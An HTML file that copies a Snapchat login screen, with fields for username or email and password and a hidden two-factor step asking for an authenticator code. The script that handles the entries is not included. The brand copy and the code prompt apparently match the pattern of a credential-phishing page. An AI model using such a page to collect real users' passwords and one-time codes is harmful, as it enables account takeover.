<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapchat Log In</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-screen">
        <header class="header">
            <h1>Log In</h1>
        </header>

        <!-- Primary Login Form -->
        <form id="loginForm" class="login-form">
            <div class="input-group">
                <label for="username">USERNAME OR EMAIL</label>
                <input type="text" id="username" name="username" autocapitalize="none" autocorrect="off" required>
            </div>

            <div class="input-group">
                <label for="password">PASSWORD</label>
                <div class="password-wrapper">
                    <input type="password" id="password" name="password" required>
                    <button type="button" class="toggle-password" id="togglePassword" aria-label="Show password">
                        <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#8e8e93" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                        <svg class="eye-slash-icon" style="display: none;" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#8e8e93" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
                    </button>
                </div>
            </div>
            <a href="#" class="forgot-password">Forgot your password?</a>
            <button type="submit" class="login-button">Log In</button>
            <p id="loginMessage" class="message"></p>
        </form>

        <!-- 2-Factor Authentication Form (Initially Hidden) -->
        <div id="twoFactorAuthContainer" class="two-factor-auth-container hidden">
            <h2>Two-Factor Authentication</h2>
            <p class="info-text">Enter the code from your authenticator app.</p>
            <form id="otpForm">
                <div class="input-group">
                    <label for="otp">VERIFICATION CODE</label>
                    <input type="text" id="otp" name="otp" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" required>
                </div>
                <button type="submit" class="login-button" id="verifyOtpButton">Verify Code</button>
            </form>
            <p id="otpMessage" class="message"></p>
            <a href="#" id="resendOtpLink" class="resend-otp">Resend code?</a>
        </div>

    </div>

    <script src="script.js"></script>
</body>
</html>
